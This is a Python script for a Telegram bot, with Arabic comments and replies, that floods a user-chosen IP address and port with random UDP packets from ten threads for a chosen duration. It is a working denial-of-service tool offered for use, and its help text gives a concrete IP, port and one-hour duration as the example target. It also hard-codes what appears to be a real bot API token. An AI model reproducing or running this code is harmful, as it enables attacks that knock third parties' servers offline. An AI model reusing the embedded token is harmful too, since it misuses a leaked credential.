import socket
import time
import random
import threading
import telebot

# توكن البوت
TOKEN = "7313070525:AAFbW4oRuXl1X5IPhRRY5Qr6rwKY8hwDBsc"
bot = telebot.TeleBot(TOKEN)

# دالة تنفيذ الهجوم لكل Thread
def udp_attack(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock.sendto(data, (ip, port))
        except:
            pass
    sock.close()

# دالة الهجوم متعدد السلاسل
def threaded_attack(ip, port, duration, threads=10):
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=udp_attack, args=(ip, port, duration))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

# أمر البدء
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "أرسل:
<IP> <PORT> <DURATION>
مثال:
80.238.137.35 17979 3600")

# التعامل مع الرسائل
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    try:
        parts = message.text.strip().split()
        if len(parts) != 3:
            bot.reply_to(message, "صيغة غير صحيحة. أرسل: IP PORT DURATION")
            return

        ip, port, duration = parts
        port = int(port)
        duration = int(duration)

        bot.reply_to(message, f"بدء الهجوم على {ip}:{port} لمدة {duration} ثانية...
(10 threads تعمل الآن)")
        threaded_attack(ip, port, duration, threads=10)
        bot.reply_to(message, "✅ تم انتهاء الهجوم.")
        bot.reply_to(message, "تم التنظيف. جاهز لهجوم جديد.")
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ: {str(e)}")

# تشغيل البوت
bot.polling()
